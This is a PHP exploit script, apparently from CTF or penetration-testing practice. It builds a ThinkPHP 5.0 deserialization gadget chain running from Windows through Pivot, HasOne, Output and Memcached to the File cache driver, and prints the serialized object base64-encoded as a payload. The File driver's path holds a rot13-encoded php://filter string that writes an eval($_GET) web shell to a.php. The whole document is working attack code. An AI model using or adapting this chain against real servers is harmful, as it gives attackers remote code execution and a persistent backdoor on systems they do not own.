<?php

namespace think\cache\driver;
class File
{
    public $tag='t';
    public $options = [
        'path'          => 'php://filter/string.rot13/resource=<?cuc @riny($_TRG[_]);?>/../a.php'
    ];
}
namespace think\session\driver;
use think\cache\driver\File;
class Memcached
{
    public $handler;
    function __construct()
    {
        $this->handler=new File();
    }
}
namespace think\console;
use think\session\driver\Memcached;
class Output
{
    public $styles = ['removeWhereField'];
    function __construct()
    {
        $this->handle=new Memcached();
    }
}
namespace think\model\relation;
use think\console\Output;
class HasOne
{
    function __construct()
    {
        $this->query=new Output();
    }

}
namespace think\model;
use think\model\relation\HasOne;
class Pivot
{
    public $append = ['getError'];
    public function __construct()
    {
        $this->error=new HasOne();
    }
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
$x=new Windows();
echo strlen(serialize($x));
echo base64_encode(serialize($x));